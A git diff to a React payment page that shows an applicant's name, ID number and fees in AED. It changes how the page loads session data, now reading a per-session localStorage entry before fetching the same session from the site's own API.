@@ -652,47 +652,51 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [sessionData, setSessionData] = useState<{fullName?: string, idNumber?: string}>({})
   const [sessionId] = useState(() => {
-    // Get session from URL or localStorage
+    // Get session from URL
     const urlParams = new URLSearchParams(window.location.search)
     const urlSessionId = urlParams.get('sessionId')
-    
-    let sid = urlSessionId
-    
-    // Try localStorage as fallback
-    try {
-      const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
-      const lastSession = sid ? sessions.find((s: any) => s.sessionId === sid) : sessions[sessions.length - 1]
-      
-      if (lastSession) {
-        setSessionData({
-          fullName: lastSession.fullName,
-          idNumber: lastSession.idNumber
-        })
-        if (!sid) sid = lastSession.sessionId
-      }
-    } catch (e) {
-      console.error('Error reading sessions from localStorage', e)
-    }
-    
-    return sid || 'FAZ-' + Date.now().toString(36)
+    return urlSessionId || 'FAZ-' + Date.now().toString(36)
   })
 
-  // Fetch session data from API to ensure we have the latest data
+  // Fetch session data from localStorage first, then from API
   useEffect(() => {
     if (sessionId) {
-      fetch(`/api/session/${sessionId}`)
-        .then(res => res.json())
-        .then(data => {
+      // First, try to get from localStorage
+      try {
+        const localData = localStorage.getItem(`fazaa_session_${sessionId}`)
+        if (localData) {
+          const parsed = JSON.parse(localData)
+          console.log('[Payment] Session data loaded from localStorage:', parsed)
+          setSessionData({
+            fullName: parsed.fullName || '',
+            idNumber: parsed.idNumber || '',
+          })
+        }
+      } catch (e) {
+        console.warn('[Payment] Failed to load from localStorage:', e)
+      }
+
+      // Then fetch from API to get the latest data
+      const fetchData = async () => {
+        try {
+          const response = await fetch(`/api/session/${sessionId}`)
+          const data = await response.json()
+          
           if (data && data.success && data.data) {
+            console.log('[Payment] Session data fetched from API:', data.data)
             setSessionData({
-              fullName: data.data.fullName || sessionData.fullName,
-              idNumber: data.data.idNumber || sessionData.idNumber,
+              fullName: data.data.fullName || '',
+              idNumber: data.data.idNumber || '',
             })
+          } else {
+            console.warn('[Payment] No session data found in API:', data)
           }
-        })
-        .catch(err => {
+        } catch (err) {
           console.error('[Payment] Failed to fetch session data from API:', err)
-        })
+        }
+      }
+      
+      fetchData()
     }
   }, [sessionId])
 
@@ -703,8 +707,8 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
   const discountAmount = '0'
 
   const transactionRows = [
-    { label: 'اسم مقدم الطلب', value: sessionData.fullName || '-' },
-    { label: 'رقم هوية مقدم الطلب', value: sessionData.idNumber || '-' },
+    { label: 'اسم مقدم الطلب', value: sessionData.fullName && sessionData.fullName.trim() ? sessionData.fullName : '-' },
+    { label: 'رقم هوية مقدم الطلب', value: sessionData.idNumber && sessionData.idNumber.trim() ? sessionData.idNumber : '-' },
     { label: 'رسوم تقديم الطلب', value: `${appFee} AED` },
     { label: 'رسوم التوصيل', value: `${deliveryFee} AED` },
     { label: 'المبلغ المستحق', value: `${dueAmount} AED` },
